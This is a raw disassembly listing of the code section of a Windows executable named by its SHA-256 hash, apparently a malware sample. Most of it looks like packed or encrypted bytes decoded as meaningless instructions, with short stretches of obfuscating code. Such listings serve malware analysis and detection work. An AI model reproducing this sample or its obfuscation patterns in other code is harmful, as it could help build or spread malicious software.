
cef2dd7e48f0cce6d1582a5b367be4c71e532722df6fe9890634fefe80fd27f4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428237,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x4282df,0x0
  401016:	mov    DWORD PTR ds:0x4282af,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x4281ff,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x4282df,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d34
  40104b:	mov    ecx,DWORD PTR ds:0x428367
  401051:	sub    DWORD PTR ds:0x42821b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428247
  40105e:	and    DWORD PTR ds:0x428203,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42818f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428287
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42833f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42826b
  401089:	mov    edx,DWORD PTR ds:0x42836b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282cf,ebx
  40109a:	and    DWORD PTR ds:0x428217,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x2c41034d]
  4010b6:	xchg   ebx,ebp
  4010b8:	mov    esi,0x18181818
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    cl,bl
  4010c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010c3:	arpl   ax,di
  4010c5:	ror    BYTE PTR [esi-0x7064e10],0xe6
  4010cc:	cs or  dl,bh
  4010cf:	jo     0x401082
  4010d1:	adc    ah,bl
  4010d3:	stc    
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [eax-0x60e1d333],esi
  40111f:	lea    edi,[esi+0x13]
  401122:	gs and al,0xa3
  401125:	es dec esi
  401127:	loope  0x401118
  401129:	into   
  40112a:	sub    al,0x4
  40112c:	fwait
  40112d:	pop    es
  40112e:	add    eax,0xc4c00044
  401133:	add    eax,0x800e62a
  401138:	adc    eax,DWORD PTR [esi]
  40113a:	jnp    0x40114a
  40113c:	xchg   esi,eax
  40113d:	sbb    esp,ebp
  40113f:	sti    
  401140:	jbe    0x4011a2
  401142:	(bad)  
  401143:	adc    DWORD PTR [esi-0x42087a2],esp
  401149:	hlt    
  40114a:	imul   edi,esp,0x6d
  40114d:	stos   BYTE PTR es:[edi],al
  40114e:	dec    ecx
  40114f:	shl    DWORD PTR [ebx+edi*4+0x66],1
  401153:	call   0xc887:0xb65be15d
  40115a:	sbb    edx,ecx
  40115c:	mov    eax,DWORD PTR [edx+0x6449b920]
  401162:	add    ch,BYTE PTR [edi+ebx*8+0x28fa8640]
  401169:	mov    al,ds:0x8a1ef66f
  40116e:	inc    esp
  40116f:	sar    esi,cl
  401171:	gs ds inc ebp
  401174:	push   0xb6c0a067
  401179:	push   ss
  40117a:	(bad)  
  40117b:	xor    edi,DWORD PTR [ecx]
  40117d:	ins    DWORD PTR es:[edi],dx
  40117e:	sub    ch,BYTE PTR [ebx]
  401180:	(bad)  [esi+0x7d]
  401183:	inc    ebp
  401184:	loope  0x401158
  401186:	retf   
  401187:	jge    0x4011fd
  401189:	cmp    eax,0xf2eea07b
  40118e:	out    dx,al
  40118f:	adc    ah,BYTE PTR [edx+0x47]
  401192:	jl     0x4011cc
  401194:	stos   DWORD PTR es:[edi],eax
  401195:	xor    dl,bl
  401197:	pop    esp
  401198:	mov    esp,0x2dd2d474
  40119d:	into   
  40119e:	sub    al,0xd2
  4011a0:	adc    esp,DWORD PTR [ebx]
  4011a2:	call   0x4583:0xf1a56065
  4011a9:	jmp    0xb5845e4c
  4011ae:	ror    DWORD PTR [edx],0xa
  4011b1:	ss mov ecx,0x6791003
  4011b7:	jp     0x40122c
  4011b9:	jge    0x4011cc
  4011bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011bc:	pop    es
  4011bd:	pop    ecx
  4011be:	addr16 inc ecx
  4011c0:	or     bl,BYTE PTR [eax+ecx*1-0x17c47407]
  4011c7:	addr16 (bad) 
  4011c9:	mov    esp,0x9f253ce5
  4011ce:	lahf   
  4011cf:	add    ebp,edx
  4011d1:	and    BYTE PTR [ebp+ebp*1+0x25],dh
  4011d5:	jmp    0x401226
  4011d7:	jg     0x401218
  4011d9:	mov    ecx,0x4b2ba188
  4011de:	imul   ecx,DWORD PTR [esi-0x39],0xc1bdf8d6
  4011e5:	cmp    DWORD PTR [esi-0x42bc8296],ebx
  4011eb:	inc    eax
  4011ec:	pop    edx
  4011ed:	jp     0x401268
  4011ef:	je     0x401184
  4011f1:	outs   dx,BYTE PTR ds:[esi]
  4011f2:	mov    edi,0xabb25ff3
  4011f7:	cmp    eax,0x5c7b707b
  4011fc:	jno    0x40122c
  4011fe:	aaa    
  4011ff:	inc    eax
  401200:	iret   
  401201:	loope  0x401244
  401203:	mov    ecx,DWORD PTR [ecx+esi*1+0x3]
  401207:	std    
  401208:	imul   esp,DWORD PTR [esi+ebx*4-0x2277ed2e],0x16
  401210:	push   edx
  401211:	jle    0x40123a
  401213:	jecxz  0x401276
  401215:	ins    BYTE PTR es:[edi],dx
  401216:	mov    bh,0xbc
  401218:	push   0x52
  40121a:	ror    DWORD PTR [edi+eax*4-0x349b774d],cl
  401221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401222:	inc    ecx
  401223:	mov    bh,0xff
  401225:	pop    ebx
  401226:	mov    edx,0xacf6b16e
  40122b:	mov    dl,cl
  40122d:	mov    ds:0x9ca22f8a,al
  401232:	mov    fs,WORD PTR [ebp-0x2ba2a227]
  401238:	sbb    BYTE PTR [ebp-0x3f1d3f3d],0xd4
  40123f:	jg     0x401273
  401241:	dec    esp
  401242:	rcl    BYTE PTR [edi+0x64f7039],1
  401248:	lods   al,BYTE PTR ds:[esi]
  401249:	call   0x512be853
  40124e:	mov    esp,0xe346b605
  401253:	lock and eax,0x1ce79626
  401259:	inc    eax
  40125a:	call   0x762a:0xe3bad643
  401261:	push   edi
  401262:	mov    dh,0x47
  401264:	cmp    edx,DWORD PTR [esi+0x2d]
  401267:	xor    ebx,ecx
  401269:	jae    0x401252
  40126b:	inc    ebx
  40126c:	add    ebx,ebp
  40126e:	arpl   di,ax
  401270:	fsub   QWORD PTR [edi+0x7a7e4744]
  401276:	cs xor eax,0x438247b5
  40127c:	hlt    
  40127d:	loopne 0x40122c
  40127f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401280:	daa    
  401281:	inc    eax
  401282:	into   
  401283:	jnp    0x401294
  401285:	inc    eax
  401286:	adc    dh,BYTE PTR [eax*2-0x8c91532]
  40128d:	mov    eax,ds:0xcf983975
  401292:	stos   DWORD PTR es:[edi],eax
  401293:	lods   al,BYTE PTR ds:[esi]
  401294:	outs   dx,BYTE PTR ds:[esi]
  401295:	fdivr  QWORD PTR [esi]
  401297:	or     BYTE PTR ds:0x678a434c,0x88
  40129e:	push   esi
  40129f:	jns    0x4012b6
  4012a1:	jmp    0xd40b:0x1dd274e4
  4012a8:	pop    eax
  4012a9:	fs pop edi
  4012ab:	jne    0x4012d1
  4012ad:	dec    edx
  4012ae:	adc    DWORD PTR [ebp-0xd58b322],ebp
  4012b4:	sbb    eax,DWORD PTR [ecx-0x4c]
  4012b7:	mov    fs,WORD PTR [ebx-0x1c07c5df]
  4012bd:	pushf  
  4012be:	mov    al,0x92
  4012c0:	inc    eax
  4012c1:	sub    DWORD PTR [ebp-0x2f],ecx
  4012c4:	pop    ss
  4012c5:	xlat   BYTE PTR ds:[ebx]
  4012c6:	ins    BYTE PTR es:[edi],dx
  4012c7:	pop    edi
  4012c8:	xchg   esp,eax
  4012c9:	pop    edx
  4012ca:	sahf   
  4012cb:	sbb    al,0x30
  4012cd:	pop    edi
  4012ce:	sti    
  4012cf:	mov    BYTE PTR ds:0xc1c6a207,ch
  4012d5:	adc    eax,0x7b2f47da
  4012da:	dec    ecx
  4012db:	xchg   edx,eax
  4012dc:	inc    cx
  4012de:	jno    0x4012bb
  4012e0:	retf   0x5007
  4012e3:	ins    DWORD PTR es:[edi],dx
  4012e4:	push   eax
  4012e5:	lea    ecx,[edi]
  4012e7:	pop    edx
  4012e8:	fistp  DWORD PTR [edi-0x33112c46]
  4012ee:	or     eax,0x1171aa8f
  4012f3:	xor    edi,DWORD PTR [esi-0x7a]
  4012f6:	push   es
  4012f7:	xchg   ebx,eax
  4012f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f9:	xlat   BYTE PTR ds:[ebx]
  4012fa:	pop    ecx
  4012fb:	and    dl,BYTE PTR [esi]
  4012fd:	add    DWORD PTR [ecx+0x410184ea],ebx
  401303:	pop    ds
  401304:	cmc    
  401305:	adc    edi,DWORD PTR [eax-0x2fd69b7a]
  40130b:	fld    QWORD PTR [esi+0x1f]
  40130e:	mov    WORD PTR [ebp-0x4d0fdd97],es
  401314:	mov    eax,0x8ce9ed0
  401319:	fldcw  WORD PTR [ecx-0x7a]
  40131c:	fisub  WORD PTR [ecx-0x41]
  40131f:	les    edi,FWORD PTR [ebp-0x30b22fde]
  401325:	mov    edx,0x107755d6
  40132a:	daa    
  40132b:	pop    esp
  40132c:	clc    
  40132d:	data16 and BYTE PTR [ebp-0x7a4d49],ch
  401334:	fs mov dh,0x22
  401337:	sbb    al,0xff
  401339:	stos   BYTE PTR es:[edi],al
  40133a:	mov    eax,0xe2426604
  40133f:	mov    edi,0x297a2315
  401344:	push   ebx
  401345:	pop    es
  401346:	lds    esi,FWORD PTR [edi+0x6440cbe]
  40134c:	sbb    BYTE PTR [ebx-0xb0ee1b0],0x59
  401353:	dec    edi
  401354:	or     ah,BYTE PTR [eax+0x23]
  401357:	gs scas al,BYTE PTR es:[edi]
  401359:	(bad)  
  40135a:	jecxz  0x401366
  40135c:	das    
  40135d:	xchg   ebx,eax
  40135e:	test   DWORD PTR [edx-0x363f2bb0],edx
  401364:	jb     0x401304
  401366:	or     dl,ah
  401368:	pushf  
  401369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40136a:	cmp    eax,0x557d5153
  40136f:	aad    0x74
  401371:	mov    esi,0xf090cb4f
  401376:	or     eax,0xb74b680c
  40137b:	cmp    esi,DWORD PTR [ebp+0x23]
  40137e:	test   DWORD PTR [ecx+0x79],edi
  401381:	or     BYTE PTR [ebx+0x4a],cl
  401384:	or     BYTE PTR [edi],ch
  401386:	mov    eax,0x34ae4254
  40138b:	inc    esi
  40138c:	jb     0x401407
  40138e:	fcomp  QWORD PTR [ebx]
  401390:	gs inc edi
  401392:	xor    al,0xba
  401394:	(bad)  
  401395:	sbb    al,0x8d
  401397:	push   ss
  401398:	shl    BYTE PTR [edi+0x60],cl
  40139b:	sbb    al,0x67
  40139d:	mov    ch,0x44
  40139f:	mov    ah,0x97
  4013a1:	xor    DWORD PTR [edx+0x12043dfd],0x2e
  4013a8:	mov    edi,?
  4013aa:	imul   ebx,DWORD PTR [edx-0x1b],0x121fd230
  4013b1:	mov    DWORD PTR [ebx],eax
  4013b3:	cmp    DWORD PTR [edi+ebx*2-0x2976a8a],edx
  4013ba:	jae    0x4013f2
  4013bc:	sbb    cl,BYTE PTR [ebx+0x6c380975]
  4013c2:	ds pop ds
  4013c4:	mov    al,ds:0x3f9604b4
  4013c9:	mov    cl,0x1f
  4013cb:	mov    esi,0xf045db2d
  4013d0:	or     al,al
  4013d2:	mov    ds:0xfd2b87d9,al
  4013d7:	push   0x3df9e0bc
  4013dc:	dec    esp
  4013dd:	pop    ebx
  4013de:	(bad)  
  4013e0:	cmp    BYTE PTR [ebp-0x4fd413c5],al
  4013e6:	lods   al,BYTE PTR ds:[esi]
  4013e7:	push   esp
  4013e8:	int    0xce
  4013ea:	test   al,0x4d
  4013ec:	repnz enter 0xb0c1,0x6c
  4013f1:	pusha  
  4013f2:	cwde   
  4013f3:	cmp    eax,0xa1a1484c
  4013f8:	mov    ecx,0xc80eae30
  4013fd:	retf   
  4013fe:	pusha  
  4013ff:	dec    eax
  401400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401401:	mov    cl,0x4b
  401403:	ficom  DWORD PTR [edx]
  401405:	scas   eax,DWORD PTR es:[edi]
  401406:	or     BYTE PTR [ebx+edi*2-0x75c25322],0x69
  40140e:	mov    bh,0xd6
  401410:	pusha  
  401411:	adc    al,0x2e
  401413:	fcomp  DWORD PTR [edi]
  401415:	xor    ebx,DWORD PTR [edx-0x384b6099]
  40141b:	shl    BYTE PTR [ebx+0x16],cl
  40141e:	mov    esi,0x11465767
  401423:	lock lods al,BYTE PTR ds:[esi]
  401425:	push   0x73
  401427:	retf   0xa46d
  40142a:	stos   DWORD PTR es:[edi],eax
  40142b:	iret   
  40142c:	jnp    0x4013f7
  40142e:	(bad)  
  40142f:	outs   dx,BYTE PTR ds:[esi]
  401430:	sub    BYTE PTR [ebx],al
  401432:	ud0    edx,DWORD PTR [ecx+ebp*1-0x11]
  401437:	and    bl,al
  401439:	and    al,0x76
  40143b:	mov    ebp,0x8c84fa2f
  401440:	add    eax,0x827f5000
  401445:	fadd   DWORD PTR [edi]
  401447:	or     dh,BYTE PTR [edx]
  401449:	add    cl,bl
  40144b:	adc    ebp,DWORD PTR [edi+esi*4-0x67]
  40144f:	scas   eax,DWORD PTR es:[edi]
  401450:	lods   eax,DWORD PTR ds:[esi]
  401451:	ss inc edx
  401453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401454:	in     eax,dx
  401455:	in     al,dx
  401456:	repnz xor bh,dl
  401459:	stos   BYTE PTR es:[edi],al
  40145a:	jl     0x401427
  40145c:	loope  0x401406
  40145e:	test   BYTE PTR [edx-0xf],0x4d
  401462:	(bad)  
  401463:	xor    eax,0xc8eb4c27
  401468:	imul   esp,DWORD PTR [edi+0x1ad09a04],0xffffffa4
  40146f:	gs xor bl,dl
  401472:	or     eax,DWORD PTR [eax+0x48576c89]
  401478:	and    dh,BYTE PTR [edx+edi*4-0x7d]
  40147c:	sub    BYTE PTR [ecx+0x344100c],ah
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42832f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42826b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282bb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x4281eb,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428213,0x0
  4014da:	mov    DWORD PTR ds:0x4281ef,ecx
  4014e0:	mov    DWORD PTR ds:0x4282b3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42812b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428213,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d38
  40151c:	mov    edx,DWORD PTR ds:0x42828b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428303
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42815f
  401537:	mov    edi,DWORD PTR ds:0x428307
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x77c7c770]
  401569:	jl     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x6181812],bl
  401573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401574:	xchg   ebp,eax
  401575:	faddp  st(4),st
  401577:	mov    ah,0x25
  401579:	sahf   
  40157a:	ins    BYTE PTR es:[edi],dx
  40157b:	sbb    ecx,ebx
  40157d:	inc    eax
  40157e:	and    eax,0x3cd1fc32
  401583:	aad    0xa1
  401585:	idiv   DWORD PTR [ebx-0x71f27632]
  40158b:	loopne 0x401551
  40158d:	aas    
  40158e:	mov    ch,0xcd
  401590:	retf   
  401591:	push   cs
  401592:	sbb    eax,0x98281ab3
  401597:	or     al,0x4c
  401599:	test   al,0x51
  40159b:	add    DWORD PTR [edi],edx
  40159d:	rol    cl,1
  40159f:	addr16 add eax,0x96ddb255
  4015a5:	sbb    ah,BYTE PTR [edx+0x730a2635]
  4015ab:	retf   
  4015ac:	cmc    
  4015ad:	jp     0x4015ca
  4015af:	ins    BYTE PTR es:[edi],dx
  4015b0:	mov    BYTE PTR [edi],dh
  4015b2:	push   edi
  4015b3:	xlat   BYTE PTR ds:[ebx]
  4015b4:	fcom   DWORD PTR [edi]
  4015b6:	repnz pushf 
  4015b8:	xchg   edx,eax
  4015b9:	dec    esi
  4015ba:	ds call 0x255417ed
  4015c0:	imul   edx,DWORD PTR ds:[ebx-0x5ec468c3],0xc
  4015c8:	inc    edi
  4015c9:	add    dl,BYTE PTR [edx-0x7c1439b6]
  4015cf:	jecxz  0x4015a7
  4015d1:	imul   ebx,DWORD PTR [edi],0x6f6a3f8b
  4015d7:	mov    ah,BYTE PTR [ecx]
  4015d9:	add    ah,BYTE PTR [ecx+eiz*2-0x11]
  4015dd:	mul    cl
  4015df:	xlat   BYTE PTR ds:[ebx]
  4015e0:	(bad)  
  4015e1:	addr16 pop ebx
  4015e3:	push   ss
  4015e4:	(bad)  
  4015e5:	test   BYTE PTR [ecx+eiz*4+0x6b],bl
  4015e9:	sub    DWORD PTR [ebp+0x0],edx
  4015ec:	test   esp,0xc99e9c36
  4015f2:	adc    al,0xdb
  4015f4:	mov    BYTE PTR [esi-0x137756ab],bl
  4015fa:	xor    al,0xf9
  4015fc:	js     0x4015a7
  4015fe:	xor    BYTE PTR [eax+0x21],0x95
  401602:	xor    eax,0xb8c5d275
  401607:	inc    ebp
  401608:	icebp  
  401609:	add    al,bh
  40160b:	xchg   edx,eax
  40160c:	je     0x401684
  40160e:	js     0x401615
  401610:	sbb    BYTE PTR [ebp+0x24],0x9b
  401614:	es (bad) 
  401616:	dec    ecx
  401617:	dec    edi
  401618:	pop    es
  401619:	clc    
  40161a:	mov    edi,0xb72ab0c4
  40161f:	adc    dh,bl
  401621:	inc    ebx
  401622:	repz (bad) 
  401624:	jg     0x4015eb
  401626:	jmp    0xd5dce3aa
  40162b:	jle    0x4015ad
  40162d:	sbb    esp,DWORD PTR [esi]
  40162f:	shl    DWORD PTR [esi],1
  401631:	(bad)  
  401632:	xchg   ebp,eax
  401633:	dec    eax
  401634:	fldcw  WORD PTR [ecx]
  401636:	push   ds
  401637:	and    dh,bh
  401639:	jecxz  0x4015f2
  40163b:	adc    ch,ch
  40163d:	pusha  
  40163e:	xlat   BYTE PTR ds:[ebx]
  40163f:	push   0x5b
  401641:	add    cl,BYTE PTR [ecx]
  401643:	ret    0x6550
  401646:	rol    DWORD PTR [ebx-0x6b5e9b5c],cl
  40164c:	(bad)
  40164f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401650:	popf   
  401651:	mov    edi,eax
  401653:	inc    esp
  401654:	add    eax,0x3ec33954
  401659:	dec    ebx
  40165a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165b:	adc    BYTE PTR [esi+0x46],0x15
  40165f:	call   0x4554392e
  401664:	sbb    eax,0x8881a6b3
  401669:	dec    ebp
  40166a:	and    cl,BYTE PTR [edi]
  40166c:	mov    ecx,0x4462c320
  401671:	sbb    eax,0x812e7e3c
  401676:	in     al,0x4
  401678:	int3   
  401679:	dec    edi
  40167a:	clc    
  40167b:	cmp    BYTE PTR [ebp-0x46],cl
  40167e:	pop    edi
  40167f:	or     cl,cl
  401681:	scas   eax,DWORD PTR es:[edi]
  401682:	jb     0x40166a
  401684:	inc    esp
  401685:	ret    0xc15
  401688:	adc    BYTE PTR [ebp+0x2d],cl
  40168b:	xchg   esp,eax
  40168c:	inc    esi
  40168d:	ret    
  40168e:	aas    
  40168f:	add    esp,DWORD PTR [ebx-0x2e78c155]
  401695:	enter  0xe551,0x80
  401699:	loop   0x4016c9
  40169b:	cdq    
  40169c:	mov    bh,0x3b
  40169e:	les    ebx,FWORD PTR [edx+ecx*8]
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	mov    bh,0x34
  4016a4:	adc    al,0x33
  4016a6:	fnstenv [ecx-0x3bee1ee4]
  4016ac:	cmp    al,0x12
  4016ae:	mov    eax,ds:0x1379ca8f
  4016b3:	in     al,0x48
  4016b5:	mov    bh,bl
  4016b7:	pop    DWORD PTR [eax+0x576ebeef]
  4016bd:	push   cs
  4016be:	out    0x12,eax
  4016c0:	fidivr DWORD PTR ds:[esi+ebx*4]
  4016c4:	das    
  4016c5:	adc    BYTE PTR [esi+esi*2],0x70
  4016c9:	cs cdq 
  4016cb:	pop    edx
  4016cc:	(bad)  [ebx]
  4016ce:	adc    DWORD PTR [edi],edi
  4016d0:	ret    
  4016d1:	dec    esp
  4016d2:	mov    eax,ds:0x6f9bb5d
  4016d7:	imul   eax,DWORD PTR [esi+eiz*1-0x2c],0x5ef8cede
  4016df:	push   cs
  4016e0:	sub    bh,cl
  4016e2:	xchg   edi,eax
  4016e4:	add    ch,BYTE PTR [edi]
  4016e6:	push   ss
  4016e7:	jp     0x4016b7
  4016e9:	dec    esi
  4016ea:	pop    eax
  4016eb:	lahf   
  4016ec:	and    ebp,ecx
  4016ee:	retf   0xc805
  4016f1:	and    al,0x89
  4016f3:	mul    DWORD PTR [ecx]
  4016f5:	xlat   BYTE PTR ds:[ebx]
  4016f6:	jno    0x4016ee
  4016f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f9:	pop    eax
  4016fa:	out    0x66,eax
  4016fc:	scas   eax,DWORD PTR es:[edi]
  4016fd:	jg     0x401683
  4016ff:	xor    esp,DWORD PTR [ebp-0x1a]
  401702:	cli    
  401703:	cli    
  401704:	(bad)  
  401705:	pop    edx
  401706:	jo     0x4016ab
  401708:	(bad)  
  401709:	hlt    
  40170a:	out    0xf6,eax
  40170c:	dec    eax
  40170d:	stos   DWORD PTR es:[edi],eax
  40170e:	sbb    eax,DWORD PTR [esi-0xe]
  401711:	sub    bl,BYTE PTR [esi+0x58]
  401714:	jmp    0x505e:0xf6245c76
  40171b:	mov    ebx,0x723c91a4
  401720:	in     eax,dx
  401721:	out    dx,al
  401722:	mov    bl,0x62
  401724:	inc    ebp
  401725:	add    BYTE PTR ds:0x21dc3608,bl
  40172b:	xor    BYTE PTR [ebx-0x7c356250],0xc
  401732:	add    bl,BYTE PTR [edi-0x13036ee2]
  401738:	and    ah,BYTE PTR [ebx-0x68]
  40173b:	and    esp,DWORD PTR [esi-0x129ba321]
  401741:	loopne 0x40178f
  401743:	in     eax,dx
  401744:	inc    edx
  401745:	stos   BYTE PTR es:[edi],al
  401746:	pop    esp
  401747:	push   ds
  401748:	adc    DWORD PTR [edx],ecx
  40174a:	stos   DWORD PTR es:[edi],eax
  40174b:	ins    DWORD PTR es:[edi],dx
  40174c:	add    ch,bh
  40174e:	fisubr DWORD PTR [ebx-0x61fda94e]
  401754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401755:	jmp    0x5078:0xa279e80c
  40175c:	dec    ecx
  40175d:	push   ecx
  40175e:	sar    al,1
  401760:	push   esp
  401761:	stos   DWORD PTR es:[edi],eax
  401762:	pop    ebp
  401763:	(bad)  
  401764:	jnp    0x4016ea
  401766:	cmc    
  401767:	outs   dx,BYTE PTR ds:[esi]
  401768:	test   DWORD PTR gs:[ebp-0x75],edx
  40176c:	cs int 0xb8
  40176f:	push   ebp
  401770:	push   0xffffff84
  401772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401773:	cdq    
  401774:	loopne 0x4016fa
  401776:	sahf   
  401777:	or     dl,BYTE PTR [edi+ebx*2+0x5d]
  40177b:	sub    BYTE PTR [ebx+ebx*2+0x5be60a57],bh
  401782:	push   edi
  401783:	add    bh,dl
  401785:	call   0x839d512c
  40178a:	(bad)  
  40178b:	fwait
  40178c:	sar    BYTE PTR [edx+eax*4+0x28b025a1],cl
  401793:	mov    eax,0x6ebb87f8
  401798:	xlat   BYTE PTR ds:[ebx]
  401799:	neg    DWORD PTR [esp+esi*1+0x1b]
  40179d:	pop    bp
  40179f:	mov    eax,ds:0x512f695a
  4017a4:	jmp    0x6fe5:0xa204d576
  4017ab:	xchg   DWORD PTR [esi+0x388f4a35],eax
  4017b1:	adc    al,0xfd
  4017b3:	adc    al,0x1b
  4017b5:	mov    esp,0xdf637804
  4017ba:	cdq    
  4017bb:	popa   
  4017bc:	repz mov eax,0x9ecd5afc
  4017c2:	repz out dx,eax
  4017c4:	pop    ebx
  4017c5:	pop    es
  4017c6:	dec    ecx
  4017c7:	outs   dx,BYTE PTR ds:[esi]
  4017c8:	aad    0x2c
  4017ca:	stc    
  4017cb:	adc    eax,0x27b99a0d
  4017d0:	fcom   DWORD PTR [eax-0xb]
  4017d3:	ret    0xaf76
  4017d6:	jbe    0x4017d8
  4017d8:	daa    
  4017d9:	imul   edi,DWORD PTR [eax],0x1f
  4017dc:	push   cs
  4017dd:	in     eax,0x13
  4017df:	daa    
  4017e0:	cmp    DWORD PTR [ebx+0xd3214dc],ecx
  4017e6:	lock or bl,BYTE PTR [edx]
  4017e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ea:	sub    ebp,DWORD PTR [eax-0x6b]
  4017ed:	cmp    al,BYTE PTR [eax]
  4017ef:	sbb    al,0x99
  4017f1:	cld    
  4017f2:	lods   al,BYTE PTR ds:[esi]
  4017f3:	jl     0x401811
  4017f5:	jns    0x4017f9
  4017f7:	outs   dx,BYTE PTR ds:[esi]
  4017f8:	pop    edi
  4017f9:	test   DWORD PTR [ebp-0x41],0x49c1c18b
  401800:	loope  0x40185a
  401802:	cmp    cl,BYTE PTR [esi]
  401804:	enter  0x2471,0xac
  401808:	scas   eax,DWORD PTR es:[edi]
  401809:	sub    esi,DWORD PTR [edi+0x78c8bb3f]
  40180f:	data16 fst DWORD PTR [ecx+0x4138af7f]
  401816:	cdq    
  401817:	xchg   edi,eax
  401818:	jge    0x4017b6
  40181a:	(bad)  
  40181b:	je     0x40179f
  40181d:	xor    esi,DWORD PTR [edx+0xf]
  401820:	fdiv   QWORD PTR [ecx]
  401822:	cmp    al,0xdd
  401824:	sub    al,0x3a
  401826:	or     al,0x73
  401828:	pop    ebp
  401829:	add    al,0xeb
  40182b:	xor    al,0x9d
  40182d:	pop    ebp
  40182e:	mov    ds:0x3aa03bb3,al
  401833:	ds out dx,eax
  401835:	es push edx
  401837:	outs   dx,BYTE PTR ds:[esi]
  401838:	mov    cl,0x80
  40183a:	jo     0x401890
  40183c:	push   eax
  40183d:	sbb    DWORD PTR fs:[ecx],0xe
  401841:	in     al,dx
  401842:	pop    esi
  401843:	fidiv  DWORD PTR [ecx+0x1fbd5fc1]
  401849:	bnd jl 0x401851
  40184c:	xchg   ebp,eax
  40184d:	add    ah,BYTE PTR [eax-0x130c5853]
